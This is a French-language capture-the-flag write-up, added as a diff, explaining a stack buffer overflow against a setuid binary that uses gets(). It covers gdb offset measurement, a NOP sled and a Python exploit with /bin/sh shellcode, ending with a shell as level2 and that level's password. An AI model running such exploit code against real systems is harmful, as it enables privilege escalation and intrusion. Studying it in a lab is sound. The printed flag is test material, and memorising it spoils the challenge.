@@ -1,0 +1,118 @@
+# On arrive sur le home, on a un binaire setuid level2
+# en essayant de le lance avec 0 ou n param, le programme a l'air d'attendre quelque chose et ne retourne rien
+# Once again >>> gdb :D 
+
+gdb ./level1
+
+# On voit que le binaire est simplement compose d'un gets, une fonction c qui ne protege pas des buffer overflow
+
+# Apres quelque recherche voici comment attaquer par buffer overflow notre binaire
+
+# Tout d'abord on determine la taille de notre buffer dans gdb
+
+(gdb) disass main
+b *0x08048495                                   // On met un breakpoint sur l'instruction leave (juste avant le return) 
+
+# Ensuite on continue et on surcharge le buffer avec des "A"
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# EIP est le registre qui stocke un pointeur qui indique la prochaine instruction a executer, elle designe donc la
+# fin de la Stack
+# C'est ce pointeur qui est override par notre buffer overflow, il est donc juste apres notre buffer. 
+
+info frame
+>>>
+Stack level 0, frame at 0xbffff700:
+ eip = 0x8048483 in main; saved eip 0xb7e454d3
+ called by frame at 0xbffff770
+ Arglist at 0xbffff6f8, args:
+ Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
+ Saved registers:
+  ebp at 0xbffff6f8, eip at 0xbffff6fc
+
+# Ici on voit que le registre EIP est a l'adress 0xbffff6fc
+# Ensuite on cherche le debut du buffer
+# Il faut savoir que que la stack stocke les variables de maniere degressif, c'est a dire que l'adresse du haut
+# de la stack est plus petite en valeur que celle du fond de la stack et qu'elle est base sur un modele LIFO 
+# (last in first out), ce qui veut dire que plus tot la variables est declarer, plus son adresse dans la stack va etre une
+# valeur eleve. EIP etant declarer au tout debut, vas etre stocke au fond de la stack tandis que le buffer (seule variable
+# du programme) vas etre stocke tout en haut de celle continue
+
+# Petit schema de la stack:
+
+|               |
+|               |
+|---------------| --------> Top de la stack ESP 
+|               |
+|    variables  |
+|    dont       |
+|    buffer     |
+|               |
+|               |
+|---------------| --------> Addresse de EIP (ici 0xbffff6fc)
+|      EIP      |
+|               |
+
+#En theorie, le buffer devrais commencer pas trop loin du haut de la stack vu que c'est surement une des seule variable
+# du programme
+#On affiche donc 24 "mots" (24 x 4 octet) apres le haut de la stack (ESP)
+
+x/24wx $esp
+>>>>
+0xbffff6a0:	0xbffff6b0	0x0000002f	0xbffff6fc	0xb7fd0ff4
+0xbffff6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+
+#Ayant rempli le buffer du caractere "A" (0x41), on voit tres bien la demarquation entre le debut du buffer et le reste 
+# le buffer commence donc a 0xbffff6b0 et se termine a EIP soit 0xbffff6fc donc le buffer fais 
+# 0xbffff6fc - 0xbffff6b0 = 0x4c = 76
+
+# Cette valeur peut etre verifier en entrant 76 fois la lettre "A", puis en incrementant et observant
+# la valeur du registre EIP
+
+# ensuite on vas cree un script python qui vas nous generer notre input, il devra surcharger le buffer pour overrider le registre
+# EIP (registre qui pointre sur la prochaine instruction), changer la valeur de EIP avec l'adresse de notre shellcode
+# qui lui vas nous ouvrir un shell avec les droits de level2
+
+# Cependant en fonction de comment/ou on lance le programme notre shell code ne sera pas situé au meme endroit
+# pour contrer ce phenomene on injecte ce qu'on appelle un nopsled, un tres grand nombre d'instruction nop qui ne
+# font absolument rien mais qui n'arrete pas le programme pour autant, donc on peut se permettre de pointer 
+# un peu au hasard au milieu de ce nopsled et le processe va glisser le long de cette rampe de nop jusqu'a notre shell code
+
+# Voici a quoi vas ressembler le code:
+
+import struct
+
+// On rempli le buffer de lettre "A"
+pad = "\x41" * 76
+// format to seul la valeur en string au format little endian
+EIP = struct.pack("I", 0xbffff710)
+// shellcode qui execute /bin/sh
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+// NOPsled
+NOP = "\x90" * 100
+// string bien formatté
+print pad + EIP + NOP + shellcode
+
+# On essaie :
+
+python /tmp/azur/exploit.py | ./level1
+>> Illegal instruction (core dumped)
+
+# Apres avoir essayé avec gdb cela fonctionne, pourquoi ? Parce que comme j'ai expliquer plus haut, la memoire change 
+# en fonction d'ou le programme est lance, comment, et quel variable d'environnement sont presente.
+# meme si on utilise la commande "gdb ./level1", le deboggeur utilise lui le chemin absolu pour lancer le binaire, ce
+# qui est different de notre "python /tmp/azur/exploit.py | ./level1"
+
+# On essaie maintenant avec le chemin absolu
+
+python /tmp/azur/exploit.py | ~/level1
+$ whoami
+>>> level2
+$ cd ../level2
+$ cat .pass
+>>> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
